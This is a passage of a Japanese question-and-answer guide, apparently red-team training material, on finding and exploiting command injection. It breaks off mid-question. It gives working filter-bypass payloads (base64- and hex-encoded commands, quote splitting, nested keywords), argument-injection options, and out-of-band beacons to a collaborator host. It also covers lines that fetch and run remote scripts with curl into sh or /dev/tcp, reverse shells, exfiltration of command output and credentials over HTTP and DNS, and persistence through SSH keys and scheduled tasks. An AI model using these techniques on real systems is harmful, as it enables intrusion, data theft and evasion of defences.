**A3**: できるが、shell が復元できるエンコードで行う。`$(echo c2xlZXAgNQ==|base64 -d)`、`$'\x73\x6c\x65\x65\x70'`、変数連結 `s""leep`/`sle\ep`(shell では引用符/バックスラッシュがキーワードマッチを断ちつつ実行は妨げない)。特定は「WAF には見えず shell には通じる等価な書き方」を探すことだ。
**Q4**: 全エンコード/変形が遮断された。この WAF 迂回の道が断たれたらどう転じる?
**A4**: payload の変形を続けず、「検出面を変える」方向に転じる。手段は、リクエストメソッドを替える(GET→POST/PUT)、Content-Type を替える(フォーム→JSON→XML、WAF は解析深度がまちまち)、パラメータ位置を替える(body→header→multipart)、チャンク転送、超長パディングで WAF の検出バッファを溢れさせる。payload が WAF の検出の弱い入口に到達するようにする。
**Q5**: 検出面を替えても駄目だ。他に直交する発想は?
**A5**: 「極小 payload + 外部ロジック」に転じる。WAF が遮断するのは識別可能な攻撃特徴であり、注入点を最短(ダウンロード実行一つか帯外一つ)に縮め、複雑ロジックは全て自分のサーバーに置く。特徴が少ないほどマッチしにくい。極小すら遮断されるなら、この入口は確かに見込みなしと判断し、別の脆弱性種別に転じる。

### クライアント側フィルタ vs サーバー側フィルタ
**Q1**: フォームがこちらの注入 payload に「不正文字」と出す。フロントエンドが遮断しているかバックエンドかどう判断する?
**A1**: フロントエンドを迂回して直接送る。プロキシ(Burp)でリクエストを遮断するか、直接生の HTTP リクエストを組み立てて送り、JS/HTML5 検証を飛ばす。フロントエンド迂回後に payload が効けば=純粋なクライアントフィルタ(形骸)。依然遮断されれば=サーバー側も検証している。これを先に区別すれば大量の無駄を省ける。
**Q2**: フロントエンドに maxlength/正規表現があり、バックエンドは未検証というのはよくあるか?
**A2**: かなりよくある。特に内部システムや急造アプリでは、開発者がフロントエンドの制限で十分と思い込んでいる。だからコマンドインジェクション特定時、第一歩は常に「ブラウザを離れて生リクエストを直接送る」ことで、多くの「防がれているように見える」点は実はバックエンドが裸だ。
**Q3**: サーバー側もフィルタすると確認した。フィルタルールの形をどう特定する?
**A3**: 二分でブラックリストを探査する。文字/キーワードごとに単一文字プローブを送り、どれが遮断されどれが通るかを記録し、ブラックリスト地図を描く(`;|&` は遮断するが `%0a` は遮断しない?`sleep` は遮断するが `ping` はしない?)。ルールの形を知って初めて狙って迂回でき、闇雲にぶつからない。
**Q4**: サーバー側フィルタがホワイトリスト(特定文字セットのみ許可)で注入できない。どこへ転じる?
**A4**: ホワイトリストはブラックリストよりはるかに迂回が難しい。方向転換として、このパラメータに兄弟 API/旧版 API がないか、検証が弱い入口を探す。同一機能の別入口(モバイル API は往々にして検証が緩い)、あるいは脆弱性種別を完全に替える。ホワイトリストが厳格なら、横方向に「同一バックエンドロジックの別のより緩い入口」を探すほうが硬直した迂回より速いことが多い。
**Q5**: 「同一バックエンド別入口」がなぜ優先して試す価値があるか?
**A5**: バックエンドのコマンド連結ロジックは web/API/モバイル/内部管理端で複数箇所再利用されることが多いが、各入口の入力検証は別の開発者/別の時期に実装され、緩急がまちまちだ。「薄弱な入口から同一の危険な集中点を打つ」ことを特定するのは強検証迂回の高効率な直交発想で、単一入口に固執するより割が合う。

### argument injection:区切り文字が全滅したときの最後の手段
**Q1**: 全コマンド区切り文字と shell メタ文字がフィルタリング/無効だが、入力が何かのコマンドに入ると確信している。まだ打てるか?
**A1**: 打てる。argument injection を進む。新しいコマンドを起動できなくても、入力が引数として既存プログラムに連結されるなら、入力が `-`/`--` で始められれば、そのプログラムの危険なオプションを注入できる。鍵は「連結されるのがどのバイナリか」と「影響を広げられるオプションが何か」の識別だ。
**Q2**: どのような一般的なプログラムの引数注入が危害が大きいか?
**A2**: 例(プレースホルダプログラム): `tar` の `--checkpoint`/`--to-command`、`find` の `-exec`、`zip` の `-T -TT`、`curl`/`wget` の `-o`(任意ファイル書き込み)、`git` の外部コマンド、`ssh`/`rsync` の `-e`、`sed`/`awk`/`env`/`perl` の -e。対象がこの種のプログラムを呼ぶと特定できれば、argument injection は変則的な RCE か任意ファイル読み書きになる。
**Q3**: 入力の位置が引数注入を許すか(オプション位置か)をどう確認する?
**A3**: 入力のコマンドライン上の位置を見る。`program <入力> fixed.txt` なら入力が前にあり、オプションを注入できる。`program fixed <入力>` ならオペランド位置かもしれず、`--` の後のオプションか `-flag=value` 形式を試す。usage エラーを誘発して、パラメータがプログラムに解析されるか純データとして扱われるかを確認する。
**Q4**: 対象プログラムに利用可能な危険オプションがなく、argument injection も通らない。どこへ転じる?
**A4**: 「対象プログラム自体の解析脆弱性」か「この機能を替える」に転じる。前者はそのプログラムの過去の CVE(あるパーサの RCE など)。後者はこの注入点の利用価値が低いと認め、アプリ内のより RCE しやすい他の機能を探す。特定は単点への執着ではなく、各点の到達可能性を評価し、成果を出せる点に力を注ぐことだ。
**Q5**: argument injection がなぜ防御側と攻撃側の双方に見落とされがちか?
**A5**: shell メタ文字を必要としないため、`;|&$` をフィルタする防御ではまったく防げない。一方攻撃者は「区切り文字がない=終わり」と慣れて諦める。execve 配列式呼び出しを識別して argument injection に転じるのは、コマンドインジェクション特定で新人と熟練を分ける鍵の判断であり、「区切り文字が全滅でも確かにコマンドに入る」なら必ず想起すべきだ。

### 二次/遅延注入の特定
**Q1**: 送った payload がその場で反応しないが、別の場所で実行されると疑う。この二段階コマンドインジェクションをどう特定する?
**A1**: 同期プローブでなく持続的な帯外ビーコンを使う。各送信に一意識別子の DNS/HTTP 戻り(`;curl <一意ID>.<collab>`)を埋め、消費し得る点を能動的に誘発する。バックグラウンド管理ページ、レポート生成、スケジュールタスク、ログ解析、エクスポート機能。collaborator を監視し、どのビーコンがいつ命中するかで、どのデータがどこで実行されるかを逆算する。
**Q2**: どの消費点を誘発すべきかをどう知る?
**A2**: データフローを追う。送ったデータはどこに保存されるか(データベース、ログ、ファイル)、誰が読むか(管理バックグラウンド表示、統計スクリプト、バックアップ、メール通知)。「保存されたユーザーデータが再びコマンド/テンプレートに連結される」段階はすべて二段階注入点だ。こちらのデータをエコーする箇所をすべて列挙し、逐一ビーコンでテストする。
**Q3**: ビーコンを埋めてもずっと誘発しない。脆弱性がないのか、誘発できていないのか?
**A3**: まず「誘発できていない」を排除する。多くの二段階点はスケジュールタスクか管理者の手動操作で誘発される。待つ必要があり(ビーコン監視を数時間続ける)、あるいは誘導を工夫する(管理者が見る必要がある内容を作るなど)。この種の点の特定では時間次元が変数で、数分反応がないからといって否定しない。
**Q4**: 長時間無誘発で、この二段階の道の検証が難しい。どの直交次元に転じる?
**A4**: 一段階で検証可能な攻撃面に転じ、二段階点は「誘発待ちの疑い」として棚上げする。レッドチームは時間が限られるとき、確実性が高く同期検証できる点を優先すべきだ。待機や特定の人の操作が必要な二段階点はバックグラウンドタスク(ビーコンを残す)として置き、他の突破口に転じる。ここで行き詰まらない。
**Q5**: 二段階注入の誘発に成功した後、どう安定利用に変える?
**A5**: ある保存点が実行されると確認したら、誘発経路を固める。「何を保存するか→誰がいつ実行するか→実行身元は何か」を明確にする。実行側が高権限のスケジュールタスク/管理プロセスなら、この点は価値が極めて高く、「誘発できる」から「制御可能な安定誘発+シェル足場確保」へ磨き、権限昇格で再利用できるよう完全なチェーンを記録する価値がある。

### 注入から安定シェルの足場確保へ
**Q1**: コマンドインジェクションで単一コマンドを実行できると確認した。どう「コマンド一つ」から「安定した対話シェル」へ格上げする?
**A1**: 段階的に進める。まず外向き通信の方向を確認する(対象が外に出られるか、どのポート/プロトコルが許可か)。これに基づきリバース方式を選ぶ。bash/nc/python リバース、または HTTP/DNS トンネル経由。直接リバースできないなら先に webshell を落とす(web ディレクトリへファイルを書く)か帯外で段階的に対話する。特定段階ではまず「外向き通信でどこへ届くか」を把握してからシェルの形を決める。
**Q2**: リバースシェルが戻らない。どの環の問題かをどう特定する?
**A2**: 環を分解して検証する。まず `;curl <IP>:<ポート>` で対象が能動的に接続できるかを確認する(外向き通信+ポートを測る)。接続できればネットワークは通っており、リバースコマンドの構文/遮断の問題。できなければ外向き通信が制限されており、ポートを替える(80/443/53 を試す)かプロトコルを替える。最も単純な帯外疎通テストで故障の環を分離する。
**Q3**: 完全に外向き通信しない(純粋な内部ネットワーク隔離)。対話能力をどう足場確保する?
**A3**: 半対話に転じる。コマンド出力を web 可読ファイルにリダイレクトして「コマンド送信+ファイル読取」の擬似対話を実現するか、既存の HTTP チャネルで tunneling する(注入点をコマンド実行 API として包装し、自分でクライアントを書いてポーリング)。無外向き通信では、対象が既に開放している内向きサービスに基づいて対話を構築し、リバースに依存しない。
**Q4**: シェルが落ちたが極めて不安定だ(コマンドがタイムアウト/プロセスが殺される)。どうする?
**A4**: 不安定の根本原因を特定する。実行にタイムアウトがある(バックエンドが timeout を設定し長コマンドが切られる)→バックグラウンドの nohup/setsid で切り離す。WAF/EDR がリバースプロセスを殺す→より隠密な足場確保(メモリ馬、正当プロセスへの注入)に替える。tty がない→python pty で格上げする。症状に応じ、反復の再接続をしない。
**Q5**: 全てのシェル足場確保手段が失敗したが、コマンドインジェクションは確かに使える。まだ価値があるか?
**A5**: ある。「ブラインドコマンド実行」に降格しても目標は達成できる。帯外で機密ファイルを持ち出す、認証情報/設定を読む、内部ネットワークを横展開で探査する、対象に公開鍵を書く/スケジュールタスクを植える。発想を変える。対話シェルが必ずしも必要ではなく、一度きりのコマンド実行+帯外持ち出しで、大量のレッドチーム目標を完了できる。「シェルを取れない」を「制限付き実行でタスクを完了する」と再定義する。

### キーワードフィルタリング:コマンド等価置換の特定
**Q1**: 区切り文字は使えるが、具体コマンドのキーワード(ファイル読取コマンドなど)が WAF に遮断された。使える等価な書き方をどう特定する?
**A1**: 一つの機能に複数のコマンド実装がある。逐一替える。ファイル読取は一つのコマンドではない。`tac`/`nl`/`head`/`tail`/`more`/`sort`/`grep .`/`awk`/`sed`/`xxd`/`od`/`base64`/`while read` ループ、さらには `mapfile` を使える。WAF ブラックリストはよくある数個しか覆わないことが多く、マイナーな等価コマンドに替えれば迂回できる。
**Q2**: コマンド名そのものが文字単位でマッチされる場合は?
**A2**: shell の文字列断ち切り技を使う。引用符挿入 `c""at`/`c'a't`、バックスラッシュ `c\at`、変数連結 `a=at;c$a file`、ワイルドカード `/bin/c?t`、`/bin/ca[t]`。これらは shell 実行時に元のコマンドへ復元されるが、字面では WAF のキーワードマッチを断つ。特定は「字面は異なり実行は同じ」書き方を探すことだ。
**Q3**: ワイルドカードも引用符断ちもフィルタリングされた。どこへ転じる?
**A3**: 「エンコード復元」層に転じる。`$(printf '\x63\x61\x74')`、`$(echo Y2F0|base64 -d)` でコマンド名をエンコードに隠し、実行時にデコードして実行する。WAF が見るのはエンコード文字列で、shell が実行時に初めてコマンドに変える。迂回の重心を「コマンド名の変形」から「実行時デコード」へ移す。
**Q4**: 全コマンド層の迂回が失敗し、この道が断たれた。直交次元へ転じる?
**A4**: 「外部スクリプト」戦略に転じる。注入点に機密コマンドを書かず、対象に `curl|sh` でリモートスクリプトを取得させるだけにする。機密コマンドは全て自分のサーバーのスクリプト内にあり、WAF は注入点でそれらを見られない。curl/wget まで遮断されるなら、`/dev/tcp` の bash ビルトインか、python/perl 一行のダウンロード実行で代替する。
**Q5**: 「コマンドを替える」が「書き方を替える」より先に試すべき理由は?
**A5**: 等価コマンドに替える(tac で cat を代替)ほうがコスト最低で間違いにくく、shell 特性に依存しない。一方引用符断ち/エンコードは具体的な shell 対応に依存し、他のルールを誘発しやすい。特定は「最小変更優先」に従う。先にコマンドを替え、次に書き方を変形し、最後にエンコード/外部化へと段階的に複雑さを上げる。

### コマンドインジェクションとデシリアライズ RCE の区別
**Q1**: シリアライズデータを受ける API(Java/PHP/Python)を見た。コマンドインジェクションかデシリアライズか?どう特定する?
**A1**: データの形と入口を見る。コマンドインジェクションは平文パラメータが shell に入る。デシリアライズは API がオブジェクトバイトストリームを受ける(Java の `AC ED 00 05` か base64 `rO0`、PHP の `O:数字:`、Python の pickle)。シリアライズのマジックヘッダ/構造を識別したら、デシリアライズ gadget チェーンの特定を進め、shell メタ文字ではない。
**Q2**: デシリアライズであり利用可能かをどう素早く確認する?
**A2**: 不正/切断されたシリアライズデータを送って異常スタックを見る。スタックに `readObject`/`unserialize`/`pickle.loads`/`ObjectInputStream` が現れればデシリアライズが起きている。さらに依存に既知 gadget があるか(ライブラリフィンガープリント)を探り、DNS 探査付き gadget(URLDNS 類)でデシリアライズが実行され外向き通信できるかを検証する。
**Q3**: デシリアライズは確認したが RCE を達成する既成の gadget チェーンがない。どうする?
**A3**: 段階的に降格する。まず DNS/探査型 gadget で制御可能性を証明する(少なくとも SSRF/探査)。次に依存内の実行型 gadget(ライブラリ版対応のチェーン)を探す。RCE チェーンがなければ、デシリアライズは依然ファイル書き込み、SSRF、DoS に利用できるかもしれない。特定の重心を「直接 RCE」から「このチェーンでどんな効果を達成できるか」へ移す。
**Q4**: 判断が誤っていた。デシリアライズでなくデータが平文処理される。どこへ転じる?
**A4**: コマンドインジェクション/式インジェクションに転じる。シリアライズデータのあるフィールドが最終的にコマンドかテンプレートに連結されるなら(オブジェクトの属性が `Runtime.exec` に入るなど)、それは「デシリアライズが誘発するコマンドインジェクション」の混合体だ。平文注入プローブに戻り、そのフィールドが直接 shell/インタプリタに入るかを測る。「API がシリアライズデータを受ける」ことに発想を固定しない。
**Q5**: コマンドインジェクションとデシリアライズを混同しやすいのはなぜか?
**A5**: 両者とも RCE に至り、かつ「データが危険に消費される」段階で起きるが、攻撃プリミティブがまったく異なる(shell 構文 vs オブジェクトグラフ gadget)。特定の第一要務はデータ入口の形を見ること(平文パラメータ vs シリアライズバイトストリーム)で、形がどの payload 体系を使うかを決める。選び間違えると全道が無駄になる。

### 長さ制限下での注入特定
**Q1**: 注入点は有効だがフィールド長制限が非常に短い(例 20 文字)。完全な payload が入らない。どうする?
**A1**: 分割と外部化。短いフィールドには誘導コマンド一つが入る。`;curl x.co|sh`(リモートスクリプト取得)か、書き込みを分割して追記する(複数リクエストで payload を `>>` で一つのファイルに追記してから実行)。特定の発想を「一度で打ち切る」から「短コマンドで完全な能力を誘導する」へ変える。
**Q2**: curl すら入らないほど短い。どう圧縮する?
**A2**: 限界まで圧縮する。最短のドメイン/IP、curl の代わりに `/dev/tcp` の bash ビルトイン、shell 変数の再利用、ワイルドカードでパスを短縮(`/???/nc`)。あるいは複数リクエストに分ける。最初に `echo 'part1'>f`、続けて `>>f` で追記し、最後に `sh f`。長い payload を複数の短いリクエストに分散する。
**Q3**: 長さ制限がフロントエンドかバックエンドかをどう判断する?
**A3**: 定石通りフロントエンドを迂回して超長値を直接送り、バックエンドが切り捨てるかエラーを返すかを見る。バックエンドが切り捨てなければ=フロントエンドの maxlength は形骸で、直接長い payload を送れる。バックエンドが N 文字へ硬切断するなら、圧縮/分割戦略が必要だ。まず本当の長さ上限を測ってから payload を設計する。
**Q4**: バックエンドが硬切断し且つ極短く、分割も外部化も現実的でない。どこへ転じる?
**A4**: 別の入力源に転じる。同一ロジックに長さ制限のない他の入口(header、アップロードファイル内容、JSON body の深層フィールド)があるかもしれない。コマンドインジェクションの危険な集中点は複数の入口からデータを与えられることが多く、無制限の入口に替えて同じ点を打つほうが、短いフィールドで無理に捻出するより高効率だ。
**Q5**: 分割追記でなぜ実行タイミングに注意するか?
**A5**: 分割書き込みの間に、ある中間状態が早期実行されるとエラーになる。「全断片を書き終えてから」`sh f` を誘発する必要がある。この種の利用の特定では書き込みと実行の順序を制御し、単独のリクエストで最終誘発を行い、競合で半端な payload が実行失敗しないようにする。

### ブラックリスト地図:文字単位の探査でフィルタルールを特定する
**Q1**: 注入点がある種のフィルタに遮られている。何を遮断するかを体系的に把握したい。どうする?
**A1**: ブラックリスト地図を描く。制御されたプローブで種別ごとにテストする。毎回単一の特殊文字/キーワード(`;` `|` `&` `$` `` ` `` `(` `)` `<` `>` 空白 `sleep` `cat` `/` `.` など)を送り、通過/遮断/エスケープの三状態を記録する。正確な「許可文字セット」と「禁止文字セット」を得れば、迂回が的を射る。
**Q2**: 「遮断」と「エスケープ/削除」をどう区別する?
**A2**: 三つの処理結果は異なる。遮断=リクエスト拒否(403/エラー)。エスケープ=文字の前に `\` が付くか HTML エンティティ化される(メタ文字としての効力を失うが残る)。削除=文字が無言で取り除かれる(payload が変形)。`a;b` を送ってエコーが `a;b`/`a\;b`/`ab` のどれかを見れば区別できる。削除型は時に二重書き `;;` で迂回できる(一つ削除され一つ残る)。
**Q3**: 削除型フィルタ(キーワード除去)だとわかった。どう利用する?
**A3**: 二重書き/ネストで迂回する。フィルタが `sleep` を空に削除するなら、`slsleepeep` は中央の `sleep` が削除されて `sleep` が残る。区切り文字 `;;`、コマンド `sysystemtem` も同様。削除型且つ非再帰と特定できたらネストで復元する。再帰削除ならこの手は無効で、エンコード/等価語に替える必要がある。
**Q4**: ブラックリスト地図が極めて厳格(ほぼ全禁)と示した。どこへ転じる?
**A4**: 「デコード窓があるか」か「入口を替える」に転じる。全禁文字セットでは、まず複数層デコードがあるか(エンコード迂回)を確認する。なければこの入口は防御が十分と判定し、同一バックエンドの弱検証入口か他の脆弱性種別に転じる。地図を描く価値の一つは「この道は防御が強すぎる、タイムリーに損切りする」という結論を素早く得ることだ。
**Q5**: ブラックリスト地図を描くのは遅すぎ、うるさすぎないか?
**A5**: リクエスト量はあるが、闇雲に payload を試すより高効率で情報密度が高い。本番環境では減速に注意し、遮断を避ける。最も重要な数種の文字(区切り文字、空白、`$`、`/`)を先に測って実行可能性を素早く判断し、それから細かく描くかを決める。特定は「最少プローブで最大のルール情報を得る」ことを重視する。

### 式インジェクション(EL/OGNL/SpEL)の精確な特定
**Q1**: Java アプリのどこかで `${...}` か `#{...}` が評価された。どの式エンジンかをどう特定する?
**A1**: エンジン特徴のプローブを使う。`${7*7}`=49 なら JSP EL/Spring 寄り。`%{7*7}` なら Struts2 OGNL 寄り。`#{7*7}` なら JSF/SpEL 寄り。さらにエンジン固有のオブジェクトで確認する。OGNL には `#context`/`@java.lang.Runtime@`、SpEL には `T(java.lang.Runtime)` がある。エンジンを正確に当てて初めて正しい RCE payload を選べる。
**Q2**: OGNL/SpEL と確認した後の RCE への鍵オブジェクトは?
**A2**: どちらも `java.lang.Runtime`/`ProcessBuilder` に通じる。SpEL は `T(java.lang.Runtime).getRuntime().exec(...)`。OGNL は `@java.lang.Runtime@getRuntime()` か ProcessBuilder 経由で、Struts の SecurityMemberAccess サンドボックスを迂回する必要がしばしばある。特定は「Runtime に到達できるか、サンドボックス制限の強度」の確認だ。
**Q3**: 式評価は成功したが exec がサンドボックスに遮られた。迂回点をどう特定する?
**A3**: サンドボックスの版と既知の迂回を特定する。Struts OGNL サンドボックスは何度も迂回されてきた(異なる CVE が異なる `_memberAccess`/コンテキスト操作手法に対応)。SpEL サンドボックスは比較的弱く、通常は直接到達できる。フレームワークの正確な版を識別→対応するサンドボックス迂回技術にマッチさせる。この段階は版に敏感な特定で、汎用 payload を無理に当ててはいけない。
**Q4**: 数学評価も効かず、`${7*7}` がそのまま返る。この式の道が断たれたらどう転じる?
**A4**: 通常の SSTI か他の注入に転じる。`${}` がそのまま返るのは、別のテンプレートエンジンに入った(`{{}}`/`#{}`/`<%%>` を試す)か、そもそもどのインタプリタにも入っていない(shell/SQL プローブを試す)可能性がある。全ての `${}` を Java EL と思い込まず、横方向に構文体系を替えて本当の実行環境を検証する。
**Q5**: 式インジェクションの特定でエンジン版を必死に特定するのはなぜか?
**A5**: OGNL/SpEL の利用可能性はフレームワーク版とサンドボックス状態に強く依存し、同じ `${7*7}=49` でも版によって直接 RCE か複雑な迂回が必要か、打てないかが変わる。特定は「評価できる」に留まらず、エンジン+版+サンドボックスまで精確にし、この点の実際の利用価値と必要な payload を判断しなければならない。

### 疑わしい点が無反応:差異化プローブで確認する
**Q1**: あるパラメータが注入点だと強く疑うが、何を送っても「同じに見える」。見込みがあるかをどう確認する?
**A1**: 差異化対照プローブを使う。「誘発すべき vs 誘発すべきでない」のペア payload を作り、レスポンスの測定可能な全次元を比較する。ステータスコード、レスポンス長、レスポンス時間、返り内容の微差、後続リクエストの挙動。肉眼で同じに見えても、ツールでバイト単位に diff し、その 1bit の差異を見つける。
**Q2**: このペアプローブを具体的にどう設計する?
**A2**: 半分は「解析されれば挙動が異なる」入力を構成する。`sleep 0` vs `sleep 8`(時間次元)、`true` vs `false` 連結(ブール次元)、構文正 vs 構文誤(エラー次元)、存在する資源 vs しない資源へのアクセス。同一次元でペア送信し、両者のレスポンスに安定した再現可能な差異があれば=注入が存在する。完全に無差異なら=ほぼ解析されていない。
**Q3**: 微小な差異はあるが注入か API 自体のランダム性か不明だ。どう排除する?
**A3**: 複数ラウンド反復して一貫性を取る。真の注入の差異は再現可能な因果だ(毎回 sleep 8 は 8s 遅い)。ランダムノイズは再現しない。5-10 ラウンド対照し、差異が安定して現れて初めて確認する。これは「疑わしい気がする」を「証拠確実」に変える必須の一歩で、ノイズによる誤判定を避ける。
**Q4**: 反復対照の末、完全に無差異・無解析の兆候と確認した。この道が断たれたらどう転じる?
**A4**: このパラメータを果断に諦め、他の攻撃面に転じる。無差異且つ複数ラウンド確認なら入力が危険に消費されていない証拠であり、続投は埋没費用だ。「除外済み」とマークし、他のパラメータ/入口/脆弱性種別に転じる。レッドチームの効率は「素早く反証して転じる」ことから来るのであって、各疑わしい点に無限に固執しない。
**Q5**: 差異化プローブの手法はコマンドインジェクション以外にどこで使える?
**A5**: 汎用だ。SQL ブラインド注入、SSTI、XXE ブラインドテスト、アクセス制御、条件競合はすべて「ペア差異化プローブ+再現可能性検証」で特定する。ブラインド状態で脆弱性の存在を確認するメタ手法だ。これを身につければ、「明らかなエコーがない」疑わしい点に直面しても、運任せで payload を当てずに体系的に確認か反証できる。

### ブルースクリーン級の混乱:コマンドインジェクションと誤判定しがちな他の注入を排除する
**Q1**: 特殊文字を注入すると挙動が異常だが、コマンドインジェクションか他の注入(SQLi/LDAP/XPath/SSRF)か不明だ。本当の種別をどう特定する?
**A1**: 各注入種別の識別プローブを分けて打つ。コマンドインジェクションは `;sleep 5`/帯外 DNS。SQLi は `' or sleep(5)-- `/`'+(select...)+'`。LDAP は `*)(uid=*`。XPath は `' or '1'='1`。SSRF はパラメータに自分の collaborator を指させてサーバーがリクエストを発起するかを見る。同じ異常パラメータにどの種別のプローブが命中するかが、その種別だ。
**Q2**: 複数のプローブが反応した場合(コマンドと SQL が両方疑わしいなど)は?
**A2**: データが複数層を流れていることを示す。パラメータが先に SQL に入り、その結果がコマンドに連結される、あるいは注入点が呼び出しチェーンの異なる段階で消費されている可能性がある。最も利用可能な層を特定する。どのプローブが最も直接的な RCE 兆候を与えるかを見て(コマンド層の帯外命中を優先)、危害が最も高い層から深入りする。
**Q3**: 「API 自体のエラー」を注入信号と誤認しないようにするには?
**A3**: ベースラインを対照する。まず明らかに不正だが注入意味のない値(超長乱数文字列)を送って API の「普通のエラー」がどう見えるかを見る。その後注入プローブを送り、普通のエラーと異なる、注入意味に合う差異(遅延、帯外、特定構文エラー)が出た場合のみ数える。ベースライン確立は誤判定排除の前提だ。
**Q4**: 全種別のプローブが無反応だ。このパラメータはそもそも注入できないのか、諦めるべきか?
**A4**: まず「パラメータが本当にバックエンドロジックに到達しているか」の検査に転じる。前置検証に遮られている、キャッシュに遮られている、そもそも無用なパラメータかもしれない。正常レスポンスを変えられる正当な値を送ってパラメータが「生きている」ことを確認してから結論を下す。パラメータが確かにレスポンスに影響するのに全注入プローブに免疫なら、他のパラメータ/入口に転じる。
**Q5**: 特定段階で種別の誤判定排除に専ら力を割くのはなぜか?
**A5**: 注入種別を選び間違えると後続の全 payload が的外れになり、大量のリクエストと時間予算を無駄にし、防御の遮断まで誘発し得る。先に少数のプローブで精確に定性してから利用に投入するのは、高効率なレッドチームの基本規律だ。刃を研ぐのは薪を割る時間の無駄にならない。

### HTTP header/環境変数チャネルのコマンドインジェクション特定
**Q1**: body パラメータを全て排除した。コマンドインジェクションが HTTP header に潜んでいると疑う。どう特定する?
**A1**: header ごとに帯外プローブを埋める。User-Agent、Referer、X-Forwarded-For、Host、Cookie、カスタム header のどれも、ログ解析スクリプト、運用監視、WAF 自身、統計プログラムに二次消費されてコマンドに連結され得る。各 header に一意識別子の `;curl <id>.<collab>` を置き、どれが命中するかを監視する。
**Q2**: なぜ header がコマンドに入るのか?典型的な場面は?
**A2**: よくあるのは、ログが shell スクリプトに処理される(logrotate 後処理、awk/grep による UA 解析)、XFF が遮断スクリプトに入って iptables を呼ぶ、Referer が統計プログラムに入る、Host が設定生成に入る。これらの「運用側が HTTP データを消費する」段階では開発者が入力検証をほとんど行わず、コマンドインジェクションの盲点になる。
**Q3**: header プローブが即時無反応だ。原因は何か?
**A3**: 多くは非同期/遅延消費だ。ログ系注入はログがスケジュール処理されるときに初めて誘発され、リクエスト即時実行ではない。帯外ビーコン監視を維持し、スケジュールタスク周期(数分〜数時間)を待つか、ログ処理を誘発する工夫をする(大量ログで rotate を誘発)。この種は天然に二段階で、同期の反応を期待しない。
**Q4**: ビーコンを埋めても長期間誘発しない。この header の道は検証が難しい。どこへ転じる?
**A4**: 「環境変数/他の隠れたチャネル」か、確認済みの攻撃面に戻る。環境変数を経由する注入もある(古典的な Shellshock の `() { :;};` が CGI 環境変数に入るなど)、ファイル名/メタデータ経由で誘発するものもある。これらのマイナーなチャネルも無果なら、header 注入を「観察待ち」とマークして(ビーコンを残す)証拠のより強い点に転じ、低確率チャネルで行き詰まらない。
**Q5**: 最終的にログ系の二段階コマンドインジェクションと確認した場合、利用上何に注意する?
**A5**: 実行身元と頻度に注意する。ログ処理はしばしば特定のサービスアカウント、場合によっては root でスケジュール実行され、一旦誘発すれば権限が非常に高いことがあり、価値が大きい。ただし誘発はリアルタイムに制御できず、スケジュール周期を待つか手動誘発の入口を探す。「注入位置+消費スクリプト+誘発条件+実行身元」を記録し、このチェーンは権限昇格の重要な足がかりになり得る。

### コマンド出力エコー位置の特定
**Q1**: コマンドインジェクションは効いた(帯外で確認)が、コマンドの実際の出力を取りたい。出力は一体どこに表示されるのか?エコー位置をどう見つける?
**A1**: 可能性のあるエコー担体を体系的に調べる。出力が現れ得るのは、直接のレスポンスボディ、あるフィールド(「結果」「ログ」「状態」欄)、エラー情報内、次のリクエストのどこかの API の返り、エクスポートされたファイル、ページの目立たない隠し領域。まず `id`/`whoami` のような短い出力を注入し、レスポンス全体(header、コメント、隠しフィールド含む)で `uid=`/ユーザー名の特徴を検索する。
**Q2**: レスポンスに出力がまったく見つからないが、コマンドは確かに実行された。どうする?
**A2**: 出力が破棄されている(コマンドの stdout がアプリにエコーされない)。「自前エコー」に転じる。出力をこちらが読める場所にリダイレクトする。web ディレクトリに書いて GET する、こちらが照会できるデータフィールドに入れる、帯外(`;id|curl -d @- <collab>` で出力を POST する / DNS サブドメインに入れる)。天然のエコーを特定できなければ人工エコーを作る。
**Q3**: 出力が長い(大ファイル読取など)。帯外やフィールドで切り捨てられた。どうする?
**A3**: 分割持ち出しを行う。shell で切る(`split`、`head/tail` 分割、`dd` をオフセットで)、あるいは毎回 DNS に一小節だけ番号付きで載せ、自分側で再構成する。あるいは先にファイルに落としてから分けて読む。特定段階ではまず単一チャネルが何バイト運べるか(帯外サブドメイン長制限、フィールド長)を測り、分割サイズを設計する。
**Q4**: エコー位置は見つかったが、出力が HTML エスケープ/エンコードされて読めない。どこへ転じる?
**A4**: 「エンコード回避+生読み取り」に転じる。コマンド出力を先に base64(`id|base64`)してからエコーさせ、自分側でデコードし、HTML エスケープと特殊文字消失を避ける。バイナリ内容なら一律 base64/hex で帯外する。エコー位置の特定は場所を見つけるだけでなく、出力が伝送チェーンで破壊されないことを保証する必要がある。
**Q5**: 真のエコーを出すことに力を割く価値があるのはなぜか?ずっとブラインドで打たないのか?
**A5**: エコーがあれば情報収集、認証情報収集、内部ネットワーク探査の効率が一桁上がる。ブラインドは毎歩推測が必要だ。レッドチームは早めに「ブラインド実行」を「エコー付き実行」に格上げすべきで、これが「脆弱性がある証明」から「実際に利用して成果を出す」への鍵の飛躍であり、優先投入に値する。

### 外向き通信が制限されたときの帯外プロトコル選択
**Q1**: コマンドインジェクションで実行を確認したが、帯外チャネルを選ぶ必要がある。対象の外向き通信が制限されている。どのプロトコルが外に出られるかをどう特定する?
**A1**: 「最も許可されやすい」順に探査する。DNS(53、ほぼ常に出られ、内部ネットワークにも再帰があることが多い)が最優先 → HTTP/HTTPS(80/443、プロキシ許可が多い)→ ICMP(ping、時々許可)→ 他の高位ポート(多くが封)。逐一帯外プローブを送り、どのプロトコルのビーコンが命中するかを記録する。それが使える出口だ。
**Q2**: なぜ DNS が通常最も優先して試されるか?
**A2**: 多くの内部ネットワークは外向き通信を厳しく制限しても、正常動作に DNS 解析が必要で、再帰クエリがこちらの authoritative NS まで転送される。ホスト自体が直接外部ネットワークへ出られなくても、DNS リクエストは内部 DNS サーバーを「借りて」外に出られることが多い。これは最も粘り強い帯外チャネルで、ブラインド注入の持ち出し第一候補だ。
**Q3**: DNS は出られるが少量のデータしか持ち出せず、HTTP も通らない。どう高効率に利用する?
**A3**: DNS を低帯域チャネルとして使う。コマンド出力をサブドメインにエンコードして分割照会する(各 label≤63 文字、総長≤253)、番号付きで再構成する。エンコード(base32/hex で DNS が許さない文字を避ける)と分割を制御する。帯域は小さいが、認証情報やコマンド結果の持ち出しには十分だ。「DNS しかない」と特定したら DNS トンネルの発想で設計する。
**Q4**: 全プロトコルの帯外が通らない(完全隔離内部ネットワーク)。この帯外の道が完全に断たれた。どこへ転じる?
